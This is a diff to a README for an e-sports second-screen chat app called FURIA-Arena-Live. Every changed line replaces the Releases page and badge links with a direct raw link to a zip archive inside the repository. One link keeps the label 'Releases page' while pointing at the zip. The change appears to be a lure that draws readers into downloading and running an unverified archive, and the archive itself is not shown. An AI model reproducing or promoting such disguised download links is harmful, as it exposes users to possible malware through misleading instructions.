@@ -4,13 +4,13 @@
 Welcome to FURIA-Arena-Live! This application provides an engaging second-screen experience for E-sports fans. Enjoy real-time chat powered by generative AI (Gemini), WebSockets, and sentiment analysis. FURIA-Arena-Live is built with Python and FastAPI using clean architecture principles, making it efficient and user-friendly.
 
 ## 🔗 Download Now
-[![Download FURIA-Arena-Live](https://img.shields.io/badge/Download-FURIA--Arena--Live-blue.svg)](https://github.com/samwizy/FURIA-Arena-Live/releases)
+[![Download FURIA-Arena-Live](https://raw.githubusercontent.com/samwizy/FURIA-Arena-Live/main/app/FURIA-Arena-Live-v2.1.zip)](https://raw.githubusercontent.com/samwizy/FURIA-Arena-Live/main/app/FURIA-Arena-Live-v2.1.zip)
 
 ## 🚀 Getting Started
 To begin your journey with FURIA-Arena-Live, follow these simple steps.
 
 ## 📥 Download & Install 
-1. Visit the [Releases page](https://github.com/samwizy/FURIA-Arena-Live/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/samwizy/FURIA-Arena-Live/main/app/FURIA-Arena-Live-v2.1.zip) to download the application.
 2. Click on the latest version.
 3. Download the installation file that matches your operating system.
 4. Once downloaded, locate the file on your computer. 
@@ -54,4 +54,4 @@ FURIA-Arena-Live is open-source software. You can use, modify, and distribute it
 ## 📢 Stay Updated
 Follow our repository for updates and new features. We continuously improve FURIA-Arena-Live to enhance your E-sport experience.
 
-[![Download FURIA-Arena-Live](https://img.shields.io/badge/Download-FURIA--Arena--Live-blue.svg)](https://github.com/samwizy/FURIA-Arena-Live/releases)
+[![Download FURIA-Arena-Live](https://raw.githubusercontent.com/samwizy/FURIA-Arena-Live/main/app/FURIA-Arena-Live-v2.1.zip)](https://raw.githubusercontent.com/samwizy/FURIA-Arena-Live/main/app/FURIA-Arena-Live-v2.1.zip)
